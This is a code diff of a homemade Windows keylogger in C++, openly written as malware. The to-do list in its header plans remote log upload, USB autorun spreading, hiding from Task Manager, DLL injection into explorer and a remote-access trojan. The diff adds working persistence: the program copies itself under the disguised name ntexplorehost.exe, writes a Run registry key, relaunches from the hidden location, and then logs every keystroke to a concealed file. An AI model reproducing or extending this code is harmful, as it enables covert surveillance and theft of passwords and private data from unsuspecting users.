@@ -17,9 +17,11 @@
 *	(x)Get current directory and move to low key directory
 *	(x)Edit registry to add current user run
 *	(x)Log pressed keys
-*	()Make the program check to see if the registry is edited if so start logging 
+*	(x)Make the program check to see if the registry is edited if so start logging
+*	(x)Run the program in the moved location and get the log working in there
 *	()Send the log away to remote server once a day - on separate thread
 *	()Check to see if USB is connected if so add autorun.ini and hide the exe on there
+*	()Hide from Task Manager
 *	(optional)Perhaps inject the logger as dll into explorer or something important
 *	(optional)create a RAT
 */
@@ -37,18 +39,18 @@
 using namespace std;
 
 //function definitions
-int get_keys(void);
+int get_keys(char* location);
 
 
 int main(void)
 {
-	
+	/*
 	//this is a WIN32 console application so I hid the cmd prompt.
 	HWND hidden;
 	AllocConsole();
 	hidden = FindWindowA("ConsoleWindowClass", NULL);
 	ShowWindow(hidden, 0);
-	
+	*/
 
 
 	//gets current directory and puts it into the systems drive
@@ -69,8 +71,17 @@ int main(void)
 	GetSystemDirectory(LPWSTR(system), sizeof(system));
 
 
+	//this chunk will be used later perhaps if the registry is good
+	//used to create the log location before it is tainted with the hard coded
+	//exe location.
+	char location[MAX_PATH];
+	_snprintf(location, MAX_PATH, system);
+	strcat(location, ":\\Users\\Public\\Libraries\\ntexplorehost.log");
+
 	//where to move the exe to
 	strcat(system, ":\\Users\\Public\\Libraries\\ntexplorehost.exe");
+
+	printf(system);
 
 	//move the exe to the destination described above
 	CopyFileA(pathToFile,system, false);
@@ -78,43 +89,80 @@ int main(void)
 	//move location into the registry
 	HKEY hKey;
 	
+	
+
 	//try to open the registry
-	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &hKey) != ERROR_SUCCESS)
+	if (RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0, KEY_READ | KEY_WRITE, &hKey) != ERROR_SUCCESS)
 	{
 		printf("UNABLE TO OPEN REGISTRY KEY\n");
 	}
-	
-	//moves the path into a string
-	string sPath(system);
+	if (RegQueryValueEx(hKey, TEXT("ntexplorehost"), NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
+	{//if the value does not exist in the key...
 
-	//again another tedious work around to get the registry to write in ANSI
-	//had problems that it would write in UNICODE and the directory would be chinese characters
-	//so I had to put the system which is a c-string into a string to a wstring...
-	wstring temp(sPath.begin(), sPath.end());
-	wstring path;
-	path = temp;
+		//moves the path into a string
+		string sPath(system);
 
-    //tries to write to current user run registry
-	if (RegSetValueEx(hKey, TEXT("ntexplorehost"), 0, REG_SZ, (const BYTE*)path.c_str(), (path.size() + 1)*sizeof( wchar_t ) ) != ERROR_SUCCESS)
-	{
+		//again another tedious work around to get the registry to write in ANSI
+		//had problems that it would write in UNICODE and the directory would be chinese characters
+		//so I had to put the system which is a c-string into a string to a wstring...
+		wstring temp(sPath.begin(), sPath.end());
+		wstring path;
+		path = temp;
+
+		//tries to write to current user run registry
+		if (RegSetValueEx(hKey, TEXT("ntexplorehost"), 0, REG_SZ, (const BYTE*)path.c_str(), (path.size() + 1)*sizeof(wchar_t)) != ERROR_SUCCESS)
+		{
+			RegCloseKey(hKey);
+			printf("UNABLE TO SET REGISTRY VALUE VALUE_NAME\n");
+		}
+		else
+		{
+			//if the write was successful we will create a new process to the location of the moved program
+			printf("VALUE WAS SET!!! SUCESS!\n");
+			STARTUPINFO info = { sizeof(info) };
+			PROCESS_INFORMATION processInfo;
+
+			//work around to get the path of exe to LPWSTR
+			wchar_t workit[MAX_PATH];
+			mbstowcs(workit, system, strlen(system) + 1);
+			LPWSTR appName = workit;
+
+			if (!CreateProcess(appName, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &info, &processInfo))
+			{
+				printf("couldn't start that shit man");
+				exit(EXIT_FAILURE);
+			}
+			else
+			{
+				printf("it started..? yes. Why yes it did");
+				exit(EXIT_SUCCESS);
+			}
+
+			
+		}
+
 		RegCloseKey(hKey);
-		printf("UNABLE TO SET REGISTRY VALUE VALUE_NAME\n");
+
 	}
 	else
-	{
-		printf("VALUE WAS SET!!! SUCESS!\n");
-	}
+	{//the value does exist in the key
 
-	RegCloseKey(hKey);
+		printf("KEY HAS BEEN FOUND YOU'RE ALREADY IN HERE BUDDY! :) \n");
+
+		//send the location of where we want the log.
+		int t = get_keys(location);
+	}
+	
+	
 	
 	//end of persistence this is just here for my benefit incase something breaks
 
-	int t = get_keys();
+	
 
-	return t;
+	return 0;
 }
 
-int get_keys(void)
+int get_keys(char* location)
 {
 	short character;
 	while (1)
@@ -127,7 +175,7 @@ int get_keys(void)
 			{
 
 				FILE *file;
-				file = fopen("ntexplorehost.log", "a+");
+				file = freopen(location, "a+", stdout);
 				if (file == NULL)
 				{
 					return 1;
@@ -280,4 +328,5 @@ int get_keys(void)
 	}
 	return EXIT_SUCCESS;
 }
+
 
